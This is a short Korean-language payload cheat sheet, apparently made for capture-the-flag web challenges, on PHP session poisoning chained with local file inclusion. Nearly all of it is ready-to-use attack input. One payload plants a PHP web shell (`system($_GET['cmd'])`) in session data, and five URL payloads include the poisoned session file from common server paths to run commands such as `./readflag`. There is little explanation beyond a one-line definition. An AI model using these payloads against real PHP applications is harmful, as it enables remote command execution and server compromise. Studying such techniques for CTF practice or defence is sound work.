Session Poisoning
세션 데이터에 악의적인 내용을 삽입하거나 변경하여 어플리케이션의 동작을 변조

# 페이로드
먼저, Session Poisoning 후
`?p=broken|data;<?php system($_GET['cmd']); ?>`

LFI와 연계
이때, 세션 위치는 아래와 같은 위치에 있을 확률이 높음
`?p=/var/lib/php/sessions/sess_687b635d46cfd929e6384b922cf50e4b&cmd=./readflag`
`?p=/tmp/sess_687b635d46cfd929e6384b922cf50e4b&cmd=./readflag`
`?p=/var/tmp/sess_687b635d46cfd929e6384b922cf50e4b&cmd=./readflag`
`?p=/var/sessions/sess_687b635d46cfd929e6384b922cf50e4b&cmd=./readflag`
`?p=/var/php/sessions/sess_687b635d46cfd929e6384b922cf50e4b&cmd=./readflag`

